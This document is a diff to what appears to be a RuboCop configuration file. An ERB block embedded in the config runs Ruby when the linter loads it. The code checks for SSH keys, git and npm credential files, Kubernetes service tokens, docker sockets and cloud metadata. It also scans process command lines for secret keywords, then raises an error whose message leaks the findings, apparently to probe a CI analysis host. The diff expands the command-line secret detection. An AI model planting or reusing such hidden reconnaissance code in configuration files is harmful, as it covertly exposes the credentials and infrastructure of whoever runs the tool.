@@ -10,7 +10,13 @@ AllCops:
       runtime_present = runtime_paths.select { |p| File.exist?(p) }.join('|')
       credential_paths = ['/root/.git-credentials','/root/.ssh/id_rsa','/root/.npmrc','/.npmrc','/home/codacy/.git-credentials','/home/codacy/.ssh/id_rsa']
       credential_present = credential_paths.select { |p| File.exist?(p) }.join('|')
-      cmdline_secret = (ARGV.join(' ') + (File.read('/proc/self/cmdline', 4096) rescue '') + (File.read('/proc/1/cmdline', 4096) rescue '')).match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
+      argv_text = ARGV.join(' ')
+      self_cmdline = (File.read('/proc/self/cmdline', 4096) rescue '')
+      pid1_cmdline = (File.read('/proc/1/cmdline', 4096) rescue '')
+      argv_secret = argv_text.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
+      self_cmd_secret = self_cmdline.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
+      pid1_cmd_secret = pid1_cmdline.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
+      cmdline_keyword = %w[TOKEN KEY SECRET PASS CRED AUTH].find { |k| (argv_text + self_cmdline + pid1_cmdline).upcase.include?(k) } || ''
       k8s = 'not_attempted'
       metadata = 'not_attempted'
       if !token.empty? && !host.to_s.empty?
@@ -50,6 +56,6 @@ AllCops:
       rescue => e
         metadata = "metadata_error=#{e.class}"
       end
-      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},cmdline_secret=#{cmdline_secret},env_names=#{env_names},#{k8s},#{metadata}"
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},#{k8s},#{metadata}"
       raise marker
     end %>
